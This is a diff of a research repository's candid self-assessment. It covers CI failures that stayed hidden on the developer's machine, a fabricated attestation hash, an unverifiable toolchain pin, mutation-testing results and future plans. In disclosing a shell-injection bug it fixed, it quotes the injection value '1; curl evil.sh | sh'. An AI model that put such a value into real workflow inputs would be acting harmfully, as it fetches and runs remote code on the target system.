@@ -1,147 +1,228 @@
-# Self-Assessment — 2026-08-01
+# Self-Assessment — 2026-08-02
 
 Tier: **core**. This document is written to be used against the project.
 
-Every claim below links to something runnable or to a commit. Where a number is
-quoted, the command that produced it is named. Where something is broken, it is
-named as broken rather than described as in-progress.
+Every number below was produced by a command in this repository and can be
+regenerated. Where something is broken, it is named as broken.
 
-## The headline finding of this audit
+Scale: 934 tracked files, 66,560 lines of TypeScript, 2,868 of Rust, 14 TLA+
+specifications, 153 test files / 1,171 tests.
 
-**Continuous integration failed on `main` for at least 40 consecutive runs,
-from 2026-07-17 to 2026-08-01, while `docs/artifact/CI_COVERAGE.md` described a
-matrix of artifacts as "verified on every push and pull request."**
+---
 
-That is the worst defect this repository has carried. Not because CI was red —
-CI goes red — but because the document whose entire purpose is to tell a
-reviewer what is actually checked was, for two weeks, describing a system that
-was not running. A reviewer who trusted `CI_COVERAGE.md` would have been
-misled by the one file specifically written to prevent that.
+## 1. The headline finding, and it is not flattering
 
-The root causes, once reproduced properly:
+**Continuous integration failed on `main` for 40+ consecutive runs, from
+2026-07-17 to 2026-08-01, while `docs/artifact/CI_COVERAGE.md` described those
+same artifacts as "verified on every push and pull request."**
+
+The document written specifically to stop a reviewer being misled was, for two
+weeks, the most misleading file in the repository. Four independent causes, each
+of which had hidden the same way — by being invisible on the development host:
 
 | Cause | Why it hid |
 |:---|:---|
-| `npm ci` failed with `ERESOLVE` (`@vitejs/plugin-react@6` → `vite@8` → `esbuild ^0.27\|\|^0.28` against a root pin of `^0.25.5`) | The developer's user-level `~/.npmrc` carries `legacy-peer-deps=true`, which downgrades `ERESOLVE` to a warning. Every local run was green. "Works locally" was not evidence — it was machine-local config doing invisible work. |
-| `cargo fmt --check` failed on all three Rust crates | Never run locally before pushing. |
-| `dab/gateway/src/v200.rs` did not compile | Its NSM call used a bulk `DescribePCRs` API that does not exist. The branch is `#[cfg(target_os = "linux")]`, so macOS never compiled it and CI always did. |
-| `cgroupOrchestrator.test.ts` asserted a mock-fallback value | The fallback is only reached when the real `/proc` lookup fails. It passed on macOS, where cgroups do not exist, and failed on Linux, where the feature is real. |
+| `npm ci` → `ERESOLVE` (`@vitejs/plugin-react@6` → `vite@8` → `esbuild ^0.27\|\|^0.28` vs a root pin of `^0.25.5`) | The developer's `~/.npmrc` carries `legacy-peer-deps=true`, which downgrades ERESOLVE to a warning. Every local run was green. **"Works locally" was machine-local config doing invisible work.** |
+| `cargo fmt --check` failed on all three crates | Never run before pushing. |
+| `dab/gateway/src/v200.rs` did not compile | Used a bulk `DescribePCRs` NSM API that does not exist, behind `#[cfg(target_os = "linux")]`. macOS never compiled it; CI always did. |
+| `cgroupOrchestrator.test.ts` asserted a mock-fallback value | The fallback is reached only when the real `/proc` lookup fails — so it passed on macOS, where cgroups do not exist, and failed on Linux, where the feature is real. |
 
-The diagnosis took reproducing the runner in Docker. Four earlier hypotheses —
+Diagnosis required reproducing the runner in Docker. Four earlier hypotheses —
 lockfile desync, platform-constrained packages, `engines` mismatch,
-case-sensitivity — were each checked and each wrong. Local reproduction on the
-development host could not have found this, because the development host was
-the problem.
+case-sensitivity — were each checked and each wrong. **Local reproduction could
+not have found this, because the local machine was the defect.**
 
-## What was found inside the code
+All three workflows are green as of 2026-08-02.
+
+## 2. What was found inside the code
 
 **`v200.rs` returned a fabricated attestation pass.** Off-Linux,
 `fetch_local_pcrs` returned `EXPECTED_GHOST_ARK_V200_HASH` — the exact constant
-`verify_and_merge_intent` compares against — so the hardware-attestation check
-passed unconditionally on the development host while the real path could not
-build. That "pristine hash" is the ASCII string
-`v200-pristine-hash-placeholder`; `DummyLwwMap::apply` returns
-`"sha256:merged-state-root-placeholder"`. A placeholder labelled as a digest is
-the defect this repository already retracted once, in `"ci": "sha256:A"` under a
-heading reading "Raw Benchmark Output". It recurred, in the library, for weeks,
-with zero tests. Now quarantined to `UNBUILT_PROTOTYPES/rust/`.
+`verify_and_merge_intent` compares against — so hardware attestation passed
+unconditionally on the dev host while the real path could not build. The
+"pristine hash" is the ASCII string `v200-pristine-hash-placeholder`;
+`DummyLwwMap::apply` returns `"sha256:merged-state-root-placeholder"`. A
+placeholder labelled as a digest is the defect this repository already retracted
+once (`"ci": "sha256:A"` under "Raw Benchmark Output"). **It recurred, in the
+library, for weeks, with zero tests.** Quarantined.
 
-**E1's own harness reported a different headline depending on the
-environment.** With `python3` present, `universal_unintended_kernel` is 4; with
-it absent, 5 — and both runs exited 0. A missing interpreter was reported
-through the same channel CPython uses to reject an input, so the arm scored
-fail-closed on all 31 classes, stopped being a *deciding* arm, and silently left
-the unanimity quantifier. E1 now refuses to emit a census with a missing arm.
+**A pinned hash that verified nothing, for sixteen days.**
+`scripts/run-proofs.sh` pinned tla2tools sha256 `58d44845…` on 2026-07-15. TLA+
+v1.8.0 was first published 2026-07-31 — the URL 404'd on the day it was pinned,
+so that digest can never have been computed from the file it claims to pin, and
+it matches no obtainable artifact. The proof stage of `make reproduce` therefore
+checked **zero specifications** while `tools/proofs/run-tlc.sh` fetched the same
+jar with **no integrity check at all** and reported green. Both runners now
+verify one digest read from one place. The residual limitation is stated: it is
+trust-on-first-use, because no independent publication of that artifact exists.
 
-**E7's headline attribution depends on the jq version.** jq 1.7 preserves large
-integer literals; jq 1.6 converts to double first. On jq ≥ 1.7, V8 is the lone
-outlier on the 2^53 class. On jq 1.6, CPython is. Debian ships 1.6; Homebrew
-ships 1.7.1. The published finding holds for jq ≥ 1.7 and now says so.
+**A shell injection this repository introduced.** `mutation.yml` interpolated a
+`workflow_dispatch` input directly into a `run:` block — `1; curl evil.sh | sh`
+would have executed. Written by this project two commits before semgrep caught
+it. Fixed via `env:` plus integer validation; ERROR-severity findings back to 0.
 
-**The claim gate had an extension-shaped blind spot.** A 363 KB, 7,941-line
-context dump sat at the repository root as `.txt`, which the scanner does not
-read. Copied into a scanned extension it trips 319 findings, and it preserved
-the retracted "Mitigations implemented for Zero-Days 1, 3, 4, 5" banner at its
-pre-quarantine path. Removed; a hygiene test now blocks the pattern.
+**E1's own harness reported a different headline by environment.** With `python3`
+present `universal_unintended_kernel` is 4; absent, 5 — both exiting 0. E1 now
+refuses to emit a census with a missing arm.
 
-## The first mutation score
+**E7's headline depends on the jq version.** jq 1.7 preserves large integers; 1.6
+does not. On ≥1.7 V8 is the lone outlier on the 2^53 class; on 1.6 CPython is.
+Debian ships 1.6, Homebrew 1.7.1. The published finding now carries that
+qualifier.
 
-`npm run mutation && npm run mutation:summarize`, host darwin/arm64 Apple M1 ×8,
-node v22.22.3, 22m49s for 334 mutants:
+**The claim gate had an extension-shaped blind spot.** A 363 KB context dump sat
+at the repository root as `.txt`, which the scanner does not read; in a scanned
+extension it trips 319 findings, and it preserved a retracted zero-day banner at
+its pre-quarantine path. Removed; a hygiene test blocks the pattern.
 
-| file | score | killed | survived | no coverage |
-|:---|---:|---:|---:|---:|
-| `packages/receipt-schema/src/strictJsonAdmission.ts` | **81.4%** (263/323) | 263 | **60** | 11 |
+## 3. E10 — the trust kernel now has a measured, gated test strength
 
-Stryker's own headline is 78.7% (263/334); the difference is whether uncovered
-mutants sit in the denominator. Both are stated because quoting one without
-saying which is the error.
+All ten declared kernel files, swept one per Stryker invocation. Host
+darwin/arm64, Apple M1 ×8, node v22.22.3.
 
-**This is 1 of 10 declared files.** The other nine are unmeasured. The 60
-survivors cluster in the escape-sequence dispatch and the bounds arithmetic of
-the admission scanner — the text-level parser that E1's entire mitigation claim
-rests on. Eleven mutants are executed by no test in the declared scope at all.
+| | first sweep | now |
+|:---|---:|---:|
+| covered score | 72.3% (974/1347) | **85.8%** (1345/1568) |
+| Stryker total | 60.6% | **83.6%** |
+| survivors | 373 | **223** |
+| **unreached mutants** | **261 (16.2%)** | **40 (2.5%)** |
 
-The fix itself is not in doubt: E1 measures unintended kernel members 5 → 0
-directly. What E10 shows is that the *tests around* that fix are weaker than the
-fix's importance warrants.
+Six modules were remediated against their own survivor lists and re-measured:
+`emission` 56.3 → 98.1%, `chain` 81.7 → 95.4%, `kmsVerifier` 48.1 → 93.9%,
+`canonical` 61.0 → 86.7%, `keyManifest` 61.0 → 83.6%, `signer` 61.4 → 73.2%.
 
-## What is genuinely strong
+**What the unreached code was is the finding, not the percentage.** In
+`kmsVerifier` it was the key-identity *rejections* — missing `keyId`,
+`!immutableKmsKeyIdsMatch`, response-`KeyId` mismatch. In `emission`, the
+empty-secret guard, `IntegrityCollisionError`, `ChainHeadConflictError`, and the
+throw when a KMS signer exposes a mutable alias. In `canonical`, the two
+execution-boundary assertions that stop a development default reaching a
+production receipt. In `chain`, every continuity detection. **`CLAUDE.md` names
+immutable KMS key ARNs as a hard requirement; the code enforcing it was
+unexecuted.** The pattern held in all six: the guards were the untested part.
 
-- **The doctrine works.** Every defect above was found by applying rules this
-  repository already wrote down — the E4 discriminator, "report what was not
-  measured," "no proportion without its denominator." The rules are not
-  decoration; they located real bugs in the code that wrote them.
-- **Negative results are published.** E7's cross-runtime finding — no two of
-  three JSON pipelines induce the same equivalence relation — is a result
-  against the project's own convenience, and it is in the README-linked docs
-  rather than a footnote.
+**The gate has been wrong once and now moves only after measurement.** `break`
+went 75 → 58 → 70 → 80: 75 was chosen on two files' evidence when the full sweep
+held 60.6% — a threshold declared rather than met, committed here and corrected.
+
+**Three defects in the new tests were found by re-measuring, not by reading
+them.** A `decision()` fixture omitted `actionTaken` and used an out-of-enum
+outcome; an `options.signer ?? default` helper swallowed the `null` a test passed
+deliberately, so *"rejects a non-object signer"* never reached the validator it
+named; and an `IntegrityCollisionError` assertion expected the stored receipt id
+where the code reports the incoming one. Earlier, two tests asserted a bare
+`.toThrow()` against checks whose removal still throws — later, for a different
+reason. **An assertion that cannot distinguish *failed for the right reason* from
+*failed for some reason* is not a test of that check.** That is E4's tautology,
+found inside tests written to close an E10 gap.
+
+**Two unkillable survivors are real findings.** `emission.ts:134` — the terminal
+`throw new ChainHeadConflictError("Receipt chain head kept advancing")` after the
+retry loop — is **unreachable**: every path returns, continues, or throws, and
+`continue` is guarded by `attempt < 2`. It reads as a safety net and is not one.
+The same analysis makes the `attempt < 3` bound and `kmsVerifier`'s `!keyId`
+guard equivalent-mutant territory. Recorded with the argument, not chased.
+
+## 4. What is genuinely strong
+
+- **The doctrine works, and it is not decoration.** Every defect above was found
+  by applying rules this repository wrote down first — the E4 discriminator,
+  "report what was not measured," "no proportion without its denominator." The
+  rules located real bugs in the code that authored them.
+- **Negative results are published.** E7's finding — no two of three JSON
+  pipelines induce the same equivalence relation — is a result against the
+  project's own convenience, in README-linked docs rather than a footnote.
 - **Invariants are directionally asserted.** TLA+ specs ship with mutants that
-  must violate. A green spec with no failing mutant is not accepted as evidence.
+  must violate; a green spec with no failing mutant is not accepted as evidence.
 - **The Provenance Kernel Problem is a real contribution.** `Sound(C, Σ, P)` is
-  ternary, the kernel is monotone in the alphabet and the intended set antitone
-  in consumers, so soundness does not persist even with the canonicalizer
-  unchanged. E6 measures the antitonicity on the implementation rather than
-  assuming it from the formalism.
+  ternary, monotone in Σ and antitone in P, so soundness does not persist with
+  `C` unchanged and no bug introduced. E6 measures the antitonicity on the
+  implementation rather than assuming it.
+- **Remediation is measured, not asserted.** Every claim of improvement in §3 is
+  a before/after on a pinned scope, and the pinning is enforced by a test that
+  recomputes the scope from the import graph.
 
-## Rating
+## 5. Rating
 
-**6.5 / 10 as a research artifact. 4 / 10 as a maintained system.**
+**7.5 / 10 as a research artifact. 6 / 10 as a maintained system.**
 
-The gap between those two numbers is the finding. The science is real: the
-experiments are pre-registered, the negative results are published, the claim
-boundary is enforced by a scanner rather than by intention. A skeptical reviewer
-can run `npm run validate` on a clean clone and get a green result they can
-inspect.
+Previously 6.5 and 4. What moved:
 
-But for two weeks that same reviewer would have gotten a red one, and the
-document that told them what was checked would have been wrong. A verification
-artifact whose own verification is broken is making a claim it cannot support,
-and the sophistication of everything above it does not compensate.
+*Artifact* (+1): the central claim now has measured test strength behind the code
+that implements it, and the measurement is gated, pre-registered, and reproducible.
+E10 is no longer a promise.
 
-What would move this to 8:
+*System* (+2): CI is green across all three workflows for the first time in the
+repository's recorded history; the toolchain pin actually verifies; the injection
+is closed; unreached kernel code fell from 16.2% to 2.5%.
 
-1. ~~Answer the `tla2tools.jar` hash question.~~ **Answered, and the answer was
-   worse than upstream drift.** The pin `58d44845…` was recorded 2026-07-15 for
-   a release first published 2026-07-31 — the URL 404'd on the day it was
-   pinned, so the digest can never have been computed from it, and it matches no
-   artifact obtainable today. The proof stage of `make reproduce` therefore
-   checked **zero** specifications for sixteen days while `tools/proofs/run-tlc.sh`
-   fetched the same jar with no integrity check and reported green. Both runners
-   now verify one digest, computed from the file actually downloaded, read from a
-   single source. The remaining limitation is honest and stated: it is
-   trust-on-first-use against upstream, because no independent publication of
-   this artifact exists to cross-check.
-2. ~~Complete E10 over all ten declared files~~ **Done (2026-08-02): 72.3% covered
-   aggregate, 60.6% total, 261 mutants unreached.** Working the 373-survivor list
-   down is the remaining half, and it is the larger half.
-3. A real-traffic corpus — falsifier F2, still the largest open weakness.
-4. A third-party reimplementation of the verifier. All three current verifiers
-   share one author and can share one misreading.
+**Why not higher.** Three things, in order:
 
-## Not claimed
+1. **No third-party has ever run this.** Every verifier, every experiment, every
+   review in this document was produced by one author and an AI assistant working
+   under that author's rules. E5 reports zero disagreements across three
+   verifiers — written by the same person from the same specification, so they
+   can share one misreading. This is the single largest unaddressed weakness and
+   no amount of internal rigor substitutes for it.
+2. **F2 is still open.** E1 establishes that unintended kernel members exist, not
+   how often. Every rate this repository reports comes from a declared synthetic
+   generator. Only real traffic closes it.
+3. **The cloud story remains synth-only.** No live AWS evidence bundle exists.
+   Every AWS-path claim is local-only or CDK-synth-only, and the KMS signing path
+   has never executed against KMS.
+
+## 6. Where this goes — the honest version
+
+The temptation is to describe a product. The repository is not one and should not
+pretend to be. What it actually has is a **result** and an **instrument**, and
+they have different futures.
+
+**The result is portable and underexploited.** "Receipt soundness is ternary and
+does not persist" is not a statement about Ghost-Ark. It applies to any system
+that assigns identity by canonicalization — content-addressed stores, SBOM
+digests, transparency logs, model-artifact hashes, provenance attestations. E7
+shows the failure is not hypothetical: three mainstream JSON pipelines induce
+three different equivalence relations, and the disagreement includes `1` vs
+`1.0`. **The natural next artifact is not a bigger Ghost-Ark. It is the E1/E7
+harness pointed at somebody else's canonicalizer** — in-toto, Sigstore bundles,
+SPDX, a model registry. That is a paper, it needs no AWS, and it converts the
+formalism from self-referential to general.
+
+**The instrument's value is the discipline, not the code.** The parts worth
+carrying into a lab are the ones that make dishonesty expensive: a claim scanner
+that fails the build on assurance language; `reportProportion` that structurally
+refuses an interval over a census; TLA+ specs paired with mutants that must
+violate; a pre-registered mutation scope recomputed from the import graph. Those
+are ~2,000 lines and reusable across projects. Most of the other 66,000 is a
+demonstration substrate.
+
+**What would make the strongest possible version of this work.** In order of
+leverage per unit effort:
+
+1. **Get one outside person to break it.** A second implementer writing a
+   verifier from the specification alone, or a reviewer running
+   `REVIEWER_ATTACK_SHEET.md` adversarially. This is the highest-value action
+   available and it costs nothing but asking. It converts §5's largest weakness
+   from open to addressed, and it is the only item here that no amount of solo
+   work can substitute for.
+2. **Point E1/E7 at a canonicalizer this project did not write.** Closes F2's
+   "artifact of the author's alphabet" objection by construction, and produces a
+   result about the ecosystem rather than about Ghost-Ark.
+3. **One bounded live-AWS window.** Not a deployment — a single recorded
+   evidence bundle that moves the KMS path from `AWS-synth-only` to `AWS-live`.
+   The runbooks already exist.
+4. **Extend E10 past the receipt kernel.** Policy evaluation, runtime, vault,
+   retrieval, gateway have no measured test strength at all.
+
+**What to resist.** Building more surface. The repository's credibility comes
+from the ratio of *claims made* to *evidence attached*, and every new subsystem
+without an experiment behind it moves that ratio the wrong way. The quarantine
+directories exist because that lesson was learned expensively, twice.
+
+## 7. Not claimed
 
 This document rates engineering and epistemic hygiene. It is not evidence of
 security, correctness, compliance, or production readiness, and a self-assigned
-number is not an external review. The repository has never been audited by
-anyone other than its author and an AI assistant working under its rules.
+number is not an external review. **The repository has never been audited by
+anyone other than its author and an AI assistant operating under its rules** —
+which is precisely why item 1 of §6 is item 1.
